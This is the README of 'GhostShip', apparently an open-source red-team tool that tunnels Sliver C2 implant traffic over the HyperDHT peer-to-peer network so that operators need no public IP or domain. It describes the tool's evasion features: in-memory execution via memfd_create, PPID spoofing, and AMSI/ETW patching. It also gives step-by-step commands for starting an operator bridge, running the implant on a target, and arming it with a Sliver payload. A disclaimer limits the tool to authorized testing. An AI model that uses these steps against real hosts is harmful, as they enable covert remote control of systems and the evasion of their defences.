# GhostShip

## P2P Command & Control Bridge
### [v1.0.0](RELEASE_NOTES.md) ðŸš¢ðŸ‘»

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Status: Alpha](https://img.shields.io/badge/Status-Alpha-red.svg)](#)

---

## Overview

**GhostShip** is a peer-to-peer (P2P) communication layer designed to bridge [Sliver C2](https://github.com/BishopFox/sliver) implants and servers through the [HyperDHT](https://github.com/holepunchto/hyperdht) network. 

By utilizing [Holesail](https://github.com/holesail/holesail) technology, GhostShip allows C2 traffic to traverse the internet via a decentralized DHT, effectively bypassing the need for public IPs, static domains, or traditional VPS infrastructure. 

> [!NOTE]
> While GhostShip obfuscates the destination of C2 traffic through P2P routing, it **does not** hide the presence of network activity (UDP/DHT traffic) on the target host.

---

## Key Features

- **P2P Transport**: Routes mTLS Sliver traffic over HyperDHT. No direct connection between the target and the operator's IP.
- **Universal Loader**: A Go-based manager for both **Linux** and **Windows** implants.
- **Stealth Residency**:
  - **Linux**: Uses `memfd_create` to execute the node runtime and payload directly from memory.
  - **Windows**: Implements **PPID Spoofing** and basic **AMSI/ETW Patching** to hinder local detection.
- **In-Memory Logic**: Communication between the P2P bridge and the Sliver payload happens via internal pipes (`socketpair` on Linux, `NamedPipes` on Windows), avoiding local port binds.

---

## Quick Start

### 1. Prepare Sliver (Operator)
Start your Sliver server and enable an mTLS listener:
```bash
sliver > mtls --lport 8888
```

### 2. Start the Operator Bridge
The bridge connects your local Sliver listener to the DHT. You can use the pre-compiled Go bridge or the Node.js script.

**Using Go Bridge:**
```bash
./bridge-linux --port 8888
# Output: Connection Key: hs://<public_key>
```

### 3. Deploy the Implant (Target)
Run the GhostShip loader on the target, providing the connection key generated by your bridge.

**Linux:**
```bash
chmod +x ghostship-linux
./ghostship-linux --connect "hs://<public_key>"
```

**Windows:**
```powershell
.\ghostship-windows.exe --connect "hs://<public_key>"
```

---

## ðŸ›  Arming the Implant (Important)

The pre-compiled releases contain **placeholders** for the Node.js runtime and the Sliver payload to keep the build small and generic. To use GhostShip in a real engagement, you must "arm" it with your own binaries:

1. **Obtain a Node.js binary** (e.g., from [nodejs.org](https://nodejs.org/en/download/prebuilt-binaries)) compatible with your target (Linux or Windows).
2. **Generate your Sliver implant** (e.g., `generate --mtls <IP> --save ./implant.bin`).
3. **Bundle and Build:**
   ```bash
   chmod +x bundle.sh
   ./bundle.sh /path/to/node /path/to/implant.bin
   make build-linux # or make build-windows
   ```

---

## Project Structure

- `implant/`: The Go loader and asset management logic.
- `bridge/go/`: Operator-side bridge implemented in Go.
- `bridge/nodejs/`: Reference implementation of the bridge in Node.js.

---

## Disclaimer

This project is for **authorized security research and penetration testing only**. Unauthorized access to computer systems is illegal.

---

*GhostShip - Sailing through the DHT.*
